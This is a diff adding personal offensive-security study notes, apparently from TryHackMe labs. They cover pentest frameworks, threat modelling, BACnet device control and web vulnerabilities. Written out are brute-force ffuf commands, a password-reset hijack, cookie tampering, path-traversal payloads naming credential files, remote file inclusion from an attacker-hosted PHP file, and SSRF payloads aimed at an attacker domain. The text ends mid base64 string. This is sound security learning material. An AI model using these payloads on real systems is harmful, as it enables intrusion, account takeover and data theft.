@@ -1,0 +1,627 @@
+#+title: Offensive Security 
+#+author: mouse
+
+* Roles 
+Penetration Tester 
+- Responsible for testing technology products for finding exploitable security vulnerabilities.
+Red Teamer 
+- Plays the role of an adversary, attacking an organization and providing feedback from an enemy's perspective.
+Security Engineer 
+- Design, monitor, and maintain security controls, networks, and systems to help prevent cyberattacks.
+* Frameworks for Penetration 
+** Basic Stages 
+- Information gathering 
+  + Collect publically accesible information about target/org 
+  + OSINT
+  + Research 
+- Enumeration/Scanning 
+  + Discovering applications and services running on target system that are potentially vulnerable 
+- Exploitation 
+  + Leveraging vulnerablities discovered on a system or application. Use of public exploits or exploiting application logic. 
+- Privilege Escalation 
+  + Once you have exploited, leveraging 
+  + Can escalate horizontally or vertically
+  + horizontal - same perms, different account 
+  + vertical - greater perms like administrator 
+- Post Exploitation 
+  + Sub-stages 
+    - What other host can be targeted ( Pivoting )
+    - What additional information can we gather from the host now that we are a priv user 
+    - Covering tracks 
+    - Reporting 
+
+** Specific frameworks 
+*** OSSTMM( The Open Source Security Testing Methodology Manual)
+- https://www.isecom.org/OSSTMM.3.pdf 
+- Strategies for systems, software, applications, communications and human aspect 
+- Focuses on how these systems communicate 
+- Includes methodology for 
+  + Telecommunications 
+  + Wired Networks 
+  + Wireless Communications 
+- Advantages 
+  + Covers various testing strategies in-depth 
+  + Includes testing strategies for specific targets (i.e. Telecommunications and Networks)
+  + Flexible frame work depending on orgs needs 
+  + Meant to set a standard for systems and applications, meaning that a universal methodology can be used in a penetration testing scenerio 
+- Disadvantages 
+  + Framework is difficult to understand, very detailed, and tends to use unique definitions 
+
+*** OWASP ( Open Web Application Security Project )
+- https://owasp.org/
+- Community driven, frequent updated framework, soley for testing of web apps and services 
+- Foundation regularly writes reports stating top ten sec vulnerabilites a web application may have, approach and remediation 
+- Advantages 
+  - Easy to pick up and understand 
+  - Actively maintained and updated 
+  - Covers all stages of an engagement, from testing to reporting and remediation 
+  - Specializes in web applications and services 
+- Disadvantages 
+  + It may not be clear what type of vuln a web app has(often they can overlap)
+  + OWASP does not make suggestions to any specific software development life cycles 
+  + Framework doesnt hold any accreditation such as CHECK 
+
+*** NCSC CAF ( National Cyber Security Centre Cyber Assessment Framework )
+- https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance
+- Extensive framework of fourteen principles used to assess the risk of various cyber threats and an orgs defences against these 
+- Applies to organizations considered to perform "vitally important services and activities"
+  + Infrastructure, banking, etc 
+- Mainly focuses on: 
+  + Data Security 
+  + System security 
+  + Identity and access control 
+  + Resiliency 
+  + Monitoring 
+  + Response and recovery planning 
+- Advantages 
+  + Framework is backed by a government cybersecurity agency 
+  + Framework provides accreditation 
+  + Framework covers fourteen principles which range from sec to response 
+- Disadvantages 
+  + Framework is still new in industry, orgs having had much time to be suitable for it 
+  + framework is based on principles and ideas and isnt as direct as having rules like some other frameworks 
+
+* Concepts
+** Types of penetration testing 
+*** Black box testing 
+- High level process where tester is not given any information about the inner workings of the app or service 
+- tester acts as regular user
+- Doesnt require knowledge of programming or understanding the program 
+- Significantly increases the amount of time spent during the information gathering and enumeration phase to understand attack surface of target 
+*** Grey-Box testing 
+- Limited knowledge of internal components of application or piece of software 
+- Saves time, chosen for extremely well-hardened attack surfaces 
+*** White-Box Testing 
+- Process is low level process usually done by software developer
+- The tester will be testing the internal components of app or piece of software 
+- Will have full knowledge of app and its expected behaviour 
+- time consuming 
+- guarentees the entire attack surface can be validated 
+** Threat modeling 
+- Process of reviewing, improving and testing the sec protocols in place in an organizations it infrastructure and services 
+- critical stage is identifying likely threats that an application or system may face, the vulns a system or application may be vulnerable to 
+- similar to risk assessment 
+  + Preperation
+  + identification 
+  + mitigations 
+  + review 
+- needs constant review and discussion with dedicated team. 
+- an effective model includes 
+  + Threat intelligence 
+  + Asset Identification 
+  + Mitigation capabilities 
+  + Risk assessment 
+*** Frameworks 
+- STRIDE
+  + Spoofing
+    - Autneticate request and users accessing a system
+    - Spoofing involves a malicious party falsely identifying itself as another 
+    - Access keys such as API keys or signatures via encryption helps remediate this threat 
+  + Tampering 
+    - By providing anti-tampering measures you help provide integrity 
+  + Repudiation 
+    - Dictates the use of services such as logging of activity for a system or application to track 
+  + Information Disclosure
+    - Applications or services that handle information of multiple users need to be appropriately configured to only show information relevant to the owner is shown 
+  + Denial of service 
+    - should be things in place to mitigate this 
+  + Evalation of privileges  
+
+** Incident 
+Breach of security classified using rating of urgency and impact 
+Incidents are responded to by a CSIRT 
+- CSIRT ( Computer Security Incident Response Team )
+- Six phases of incident response 
+  + Preperation 
+  + Identification 
+  + Containment 
+  + Eradication 
+  + Recovery 
+  + Lessons learned 
+* OT Sec 
+Operational Technology Secuirty 
+- SCADA Servers 
+- ICS ( Industrial Control Systems )
+- HMI ( Human Machine Interfaces )
+- PLCs ( Programmable Logic Controllers )
+
+Often old protocols like: 
+- Modbus 
+- DNP3 
+- Ethernet/IP 
+- BACnet 
+** BACnet/IP and BACnet MS/TP 
+Building Automation and Control Network 
+Used with BAS ( Building Autonomous Systems )
+Controls things in modern buildings like:
+- HVAC 
+- Lighting Control 
+- Access Control 
+- Fire Detection Systems 
+MS/TP variant uses RS485 standard 
+*** IP Variant: 
+- Uses UDP 
+- Served on port 47808 - hexidecimal BAC0 
+BACnet devices organized as series of Objects 
+- Each Object having 
+  + Type 
+    - analogInput
+    - analogOutput 
+      - Writable 
+    - binaryInput 
+    - binaryOutput
+      - Writable  
+  + Set of Properties 
+- All items have a ReadProperty service and many have a WriteProperty 
+- WriteProperty used to change values remotely 
+- Much communication is done with broadcast packets 
+
+**** Mapping devices that will tell you everything 
+nmap -sU script bacnet-info -p 47808 192.168.56.0/24 
+***** BACpypes 
+python3 samples/ReadObjectList.py  2749 192.168.56.103 
+- device number 2749 
+- at IP 
+python3 samples/ReadWriteProperty.py 
+will present you with a prompt 
+> read 192.168.56.103 analogueValue:201 presentValue 
+> write 192.168.56.103 analogueValue:201 presentValue 88.0 
+- For analog values - for digital use binaryValue 
+- active and inactive options 
+*** Tools Hardware 
+- BASControl22 
+  + Used often for controlling and monitoring HVAC Systems 
+*** Tools Software 
+- BASEmulator 
+  + Emulator of BAScontrol22 hardware 
+- BACpypes 
+  + BACnet Module for python
+*** Checkout 
+15-19-09-42_Bacnet_For_Beginners2.pdf  
+BACnetIntroduction.pdf
+Kaur2015_Chapter_SecuringBACnetSPitfalls.pdf 
+* Web Sec 
+** Processes 
+*** Walking an Application - basic tools 
+- Explore the website and note down individual pages/areas/features with a summary for each 
+- Review the source of a web page- dev tools  
+  - discover frameworks and more 
+  - Inspect Element 
+  - Debugger , pretty print options, break points 
+  - Network tab/log 
+*** Content Discovery
+**** 3 Main types of Content Discovery 
+- Manually
+  + robots.txt 
+    - great list of places that don't want to be seen 
+  + favicon
+    - Can give you information about framework used 
+    - https://wiki.owasp.org/index.php/OWASP_favicon_database
+  + sitemap.xml 
+    - opposite of robots.txt
+    - areas of site hard to navigate to, or old webpages that site no longer uses can be found here too
+  + HTTP headers
+    - can contain information such as server software, programming language 
+    - check it by curling with -v 
+  + check into framework, found in source or by favicon or other above methods 
+- OSINT 
+  + Google hacking/dorking 
+    - utilizing google advanced search features, pick out custom content 
+      + Basic filters 
+        - site 
+        - inurl 
+        - filetype 
+        - intitle 
+  + Wappalyzer 
+    - see tools 
+  + wayback machine , uncover old active pages 
+  + Github 
+    - company names 
+    - website names 
+    - locate site repos 
+    - possibly even passwords
+  + S3 Buckets 
+    - storage service - AWS 
+    - often incorrect permissions 
+    - format:  http(s)://{name}.s3.amazonaws.com
+      + One common automation method is by using the company name followed by common terms such as: 
+        - {name}-assets
+        - {name}-www
+        - {name}-public
+        - {name}-private
+- Automated
+  + Wordlist ex SecList 
+  + Automation tools some:
+    - ffuf 
+    - dirb 
+    - gobuster 
+*** Subdomain Enumeration 
+Process of finding valid subdomains for a domain, can help you find more potential vulnerabilities 
+Methods:
+- Brute Force 
+  + dnsrecon 
+- OSINT 
+  + SSL/TLS Certs 
+    - CT logs ( Certificate Transparency logs ), are publically accessible
+  + Search engines 
+    - "-site:www.domain.com site:*.domain.com"
+  + Sublist3r 
+- Virtual Host
+  + Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. 
+  + can use the brute forcing tools to find through host header 
+  #+BEGIN_SRC sh 
+  user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
+  user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}
+  #+END_SRC
+** Vulnerabilities
+*** Authentication bypass
+- Username Enumeration 
+  + Grabbing list of valid user names
+  + Website error messages can be a good resource 
+    - Forum to create new user e.g. - Account exists error 
+      + Can exploit this with ffuf and a list of common used usernames 
+      #+BEGIN_SRC bash
+      user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
+      #+END_SRC
+  + -w argument selects files location 
+  + -X specifies request method 
+  + -d argument specifies data to be sent ( POST in X above )
+  + -H is used for adding additional headers for request  
+  + -u argument specific URL to make request 
+  + -mr is sext we are looking for
+- Brute Force 
+  + Again list method - fuff 
+  + list of commonly used passwords 
+  #+BEGIN_SRC bash
+  user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200 
+  #+END_SRC 
+  + W1 - vaild user names 
+  + W2 - passwords 
+  + -w wordlist 
+  + -fc argument http status code other than 200 
+- Logic Flow 
+  + Example mock code with issue 
+  #+BEGIN_SRC PHP 
+  if( url.substr(0,6) === '/admin') {
+    # Code to check user is an admin
+  } else {
+    # View Page
+  }
+  an unauthenticated user requesting /adMin will not have privileges checked and have page displayed to them 
+  #+END_SRC
+  + Password reset field where email is delivered seperately 
+  #+BEGIN_SRC bash
+  curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+  #+END_SRC
+- Cookie Tampering 
+  + The contents of cookies can be in plain text or hashed 
+  + can set cookies with CURL, for example set yourself as logged in with a user or admin 
+  #+BEGIN_SRC bash
+  curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test 
+  curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
+  #+END_SRC
+  + sometimes cookie values are hased 
+    - md5 
+    - sha-256 
+    - sha-512
+    - sha-1 
+    - https://crackstation.net/ can help you identify and crack 
+  + Sometimes cookies can be encoded, base32, base64 etc 
+    + e.g. Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
+  +This string base64 decoded has the value of {"id":1,"admin": false}
+*** IDOR ( Insecure Direct Object Reference )
+- Access Control vulnerability 
+- Can occur when a web server receives user-supplied input to retrieve objects 
+  + Too much trust placed into input data 
+  + Improper validation on the servicer side to confirm authorization/authentication 
+- e.g. changing the user_id value to 1000 instead (http://online-service.thm/profile?user_id=1000), and to your surprise, you can now see another user's information.
+- Encoded IDs 
+  + same idea, but parameters base64 encoded 
+- Hased IDs are a little bit more complicated, they may follow a predictable pattern
+  - Worthwhile checking any hases through something like crack station 
+- Finding IDORs in Unpreditable IDs 
+  + If ID cannot not be detected using above methods a good method is create two accounts and swap the ID number 
+  + If you can view other users content using ID Number you've found valid IDOR 
+- Location of IDORs 
+  + May not be something you see, could be content your browser loads via AJAX request that are found referenced in a JS file 
+  + Sometimes endpoints could have an unreferenced parameter that may haven been of some use during dev 
+  + may notice call to /user/details showing user information 
+  + enter parameter mining, might discover a parameter like user_id and display information with /user/details?user_id=123
+*** File Inclusion 
+- LFI ( Local File Inclusion )
+- RFI ( Remote File Inclusion )
+- Directory Traversal 
+- In some scenerios Web apps are written to request access to files on a given system
+  + Including images, static text, and so on via parameters 
+- Parameters are query parameter strings attached to the url that could be used to retrieve data or perform actions based on user input 
+- Essential parts of URL: http://webapp.thm/get.php?file=userCV.pdf 
+  + protocol : http://
+  + Domain Name : webapp.thm 
+  + File Name : get.php 
+  + query string: ?{param}=
+  + Parameters : file
+  + input : userCV.pdf 
+- File inclusion vulns are commonly found in various prog langs for web apps such as PHP that are written and implemented poorly 
+  + User input not validated 
+- Risk: Can be used to read sensitive data
+  + code 
+  + credentials 
+  + possibility to write top bad location ( remote command execution RCE ) 
+**** Directory Traversal / Path Traversal and Local File Inclusion (LFI)
+- Security vulnarbility that allows attacker to read operating system resources
+- Exploited by URL manipulation 
+- Input passed to a function such as file_get_contents in PHP application 
+  + https://www.php.net/manual/en/function.file-get-contents.php
+- Common OS Files to look for 
+  + /etc/issue 
+  + /etc/profile 
+  + /proc/version 
+  + /etc/passwd 
+  + /etc/shadow 
+  + /root/.bash_history 
+  + /var/log/dmessage 
+  + /var/mail/root 
+  + /root/.ssh/id_rsa 
+  + /var/log/apache2/access.log 
+  + C:\boot.ini  
+- http://10.10.56.42/lab1.php?file=/etc/passwd
+- often caused by developers lack of security awareness 
+- with PHP using functions such as include, require, include_once and require_once  
+- e.g. 
+  #+BEGIN_SRC PHP 
+  <?PHP 
+	include($_GET["lang"]);
+  ?>
+  #+END_SRC
+- GET request via URL Parameter lang to include a file in page  
+  + Problem is this could expose all files on the server 
+  + e.g. http://webapp.thm/get.php?file=/etc/passwd
+- Warning: include(includes/etc/passwd) [function.include]: failed to open stream: No such file or directory in /var/www/html/lab2.php on line 26
+- Now below get around 
+- http://10.10.56.42/lab2.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+- Note that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. But we still receive the following error:
+- Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
+- It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. 
+- To bypass this scenario, we can use the NULL BYTE, which is %00.
+- By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:
+- include("languages/../../../../../etc/passwd%00").".php"); 
+- which equivalent to → include("languages/../../../../../etc/passwd");
+- http://10.10.56.42/lab5.php?file=.//....//....//....//....//etc/passwd
+- curl -X POST -F 'file=/etc/flag1' http://10.10.56.42/challenges/chall1.php
+- curl 'http://10.10.56.42/challenges/chall3.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'file=../../../../etc/flag3%00' --output flag.out
+**** RFI ( Remote File Inclusion )
+- allowing an attacker to inject an external URL into include function
+- One requirement for RFI is that the allow_url_fopen option needs to be on.
+- The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
+  + Sensitive Information Disclosure
+  + Cross-site Scripting (XSS)
+  + Denial of Service (DoS)
+- The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.
+- <?PHP echo "Hello THM"; ?>
+- First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. 
+#+BEGIN_SRC bash 
+┌──(mouse㉿mousefruit)-[~/host]
+└─$ cat ./cmd.txt     
+<?PHP print exec('hostname'); ?>
+
+                                                                                                                            
+┌──(mouse㉿mousefruit)-[~/host]
+└─$ python3 -m http.server
+#+END_SRC
+http://10.10.209.105/playground.php?file=http%3A%2F%2F10.18.11.84%3A8000%2Fcmd.txt
+**** SSRF (Server-Side Request Forgery)
+Allows malicious user to cuse the webserver to make an additional or edited HTTP request to resource of the attackers 
+***** Types 
+- Regular 
+  + Data is returned to attackers screen 
+- Blind 
+  + Vulnerability where SSRF occurs but no information is returned to the attackers screen 
+***** Impact 
+- Access to unauthorized areas 
+- Access to customer/organizational data 
+- Ability to scale to internal networks 
+- Reveal authentication tokens/credentials 
+***** Example/Processes 
+EX 1: Full URL 
+Expected Request: http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123 
+"Hacker" Request: http://website.thm/stock?url=http://api.website.thm/api/user 
+API Server returns: user data instead of stock information 
+
+EX 2: Path only 
+Expected Request: http://website.thm/stock?url=/item?id=123 
+"Hacker" Request: http://website.thm/stock?url=/../user 
+API Server returns: user data instead of stock information 
+
+EX 3: Take note of the payload ending in &x= being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string.
+Expected Request: http://website.thm/stock?server=api&id=123 
+"Hacker" Request: http://website.thm/stock?server=api.website.thm/api/user&x=&id=123
+"Website" Request: api.website.thm/api/user?=.website.thm/api/stock/item?id=123 
+API Server returns: user data instead of stock information 
+
+EX 4: Requesting Attackers Resource 
+Expected Request: http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123 
+"Hacker" Request: http://website.thm/stock?url=http://hacker-domain.thm/
+Website Request: data from hacker-domain.thm instead of api.website.thm - this reveals API Key 
+
+Exercise: 
+Using what you've learnt, try changing the address in the browser below to force the webserver to return data from https://server.website.thm/flag?id=9. To make things easier the Server Requesting bar at the bottom of the mock browser will show the URL that website.thm is requesting.
+https://website.thm/item/2?server=server.website.thm/flag?id=9&
+***** Finding
+Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:
+- When a full URL is used in a parameter in the address bar: http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123 
+- A hidden field in a form: <input type="hidden" name="server" value="http://server.website.thm/store">
+- A partial URL: http://website.thm/stock?server=api&id=123 
+- Path of the URL: http://website.thm/stock?url=/item?id=123
+***** Tools 
+If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.
+***** THM Flag 
+- Created account on https://10-10-12-109.p.thmlabs.com/
+- avatar selection page:<div class="avatar-image" style="background-image: url('/assets/avatars/4.png')"></div>
+- Current avatar: <div class="avatar-image" style="background-image: url(data:image/png;base64,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